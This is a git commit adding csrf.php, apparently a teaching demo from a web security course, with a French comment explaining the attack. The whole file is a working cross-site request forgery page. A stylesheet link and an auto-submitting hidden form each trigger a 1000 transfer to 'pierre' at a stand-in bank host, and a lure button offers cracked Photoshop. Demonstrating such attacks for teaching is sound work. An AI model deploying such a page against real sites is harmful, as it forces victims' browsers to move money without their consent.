c5e25191aae40b99043c26fb93787087edc74582
Pierre Bretéché <pbreteche@dawan.fr>
2025-08-01 11:37:06 +0200

    CSRF

---
+++ 07-injections/csrf.php
@@ -0,0 +1,23 @@
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport"
+          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Document</title>
+    <!-- CSRF simple, on profite que l'application ne respecte pas HTTP et permet d'effectuer des actions sur des "GET" -->
+    <link type="text/css" rel="stylesheet" href="https://banque.com/virement.php?dest=pierre&montant=1000">
+</head>
+<body>
+<form action="https://banque.com/virement.php" method="post">
+    <input type="hidden" name="dest" value="pierre">
+    <input type="hidden" name="montant" value="1000">
+    <button>Télécharger gratuitement photoshop cracké</button>
+</form>
+<script>
+    document.forms[0].submit();
+</script>
+</body>
+</html>
+
